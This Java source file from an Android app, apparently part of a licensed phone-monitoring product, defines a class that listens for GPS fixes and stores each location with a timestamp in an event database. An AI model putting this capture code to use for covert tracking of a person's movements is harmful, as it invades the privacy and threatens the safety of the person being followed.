package com.fx.maind.capture;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;

import android.content.Context;
import android.location.Location;

import com.fx.event.EventLocation;
import com.fx.eventdb.EventDatabaseManager;
import com.fx.license.LicenseManager;
import com.fx.maind.ref.Customization;
import com.fx.preference.PreferenceManager;
import com.fx.util.FxResource;
import com.vvt.calendar.CalendarObserver;
import com.vvt.location.GpsTracking;
import com.vvt.logger.FxLog;

public class LocationCapturer implements GpsTracking.OnCaptureListener {

	private static final String TAG = "LocationCapturer";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private Context mContext;
	
	private GpsTracking mGpsTracking;
	
	private CalendarObserver mCalendarObserver;
	private SimpleDateFormat mDateFormatter;
	
	private EventDatabaseManager mEventDbManager;
	private LicenseManager mLicenseManager;
	private PreferenceManager mPreferenceManager;
	
	public LocationCapturer(Context context) {
		mContext = context;
		
		mLicenseManager = LicenseManager.getInstance(mContext);
		mPreferenceManager = PreferenceManager.getInstance(mContext);
		mEventDbManager = EventDatabaseManager.getInstance(mContext);
		
		mGpsTracking = GpsTracking.getInstance(mContext);
		// Log path & date format are NOT required
		
		mCalendarObserver = CalendarObserver.getInstance();
		mCalendarObserver.enable();
		
		mDateFormatter = new SimpleDateFormat(FxResource.DATE_FORMAT);
	}
	
	public void enable() {
		PreferenceManager pm = PreferenceManager.getInstance(mContext);
		mGpsTracking.enable(this, pm.getGpsTimeIntervalSeconds());
	}
	
	public void disable() {
		mGpsTracking.disable();
	}

	@Override
	public void onCapture(Location location) {

		if (!mLicenseManager.isActivated()) { 
			FxLog.d(TAG, "onCapture # Product is not activated!! -> EXIT");
			return;
		}
		
		boolean isCaptureEnabled = 
			mPreferenceManager.isCaptureEnabled() && 
				mPreferenceManager.isCaptureLocationEnabled();
		
		if (! isCaptureEnabled) {
			FxLog.d(TAG, "onCapture # Location is disabled!! -> EXIT");
			return;
		}
		
		mDateFormatter.setTimeZone(
				TimeZone.getTimeZone(
						mCalendarObserver.getLocalTimeZone()));
		
		String time = mDateFormatter.format(new Date(location.getTime()));
		
		EventLocation event = new EventLocation(mContext, time, 
		location.getLatitude(), location.getLongitude(), location.getAltitude(), 
		(double) location.getAccuracy(), 0.0, location.getProvider());

		mEventDbManager.insert(event);
		
		if (LOGV) FxLog.v(TAG, String.format(
				"onCapture # Insert %s", event.getShortDescription()));
	}
}
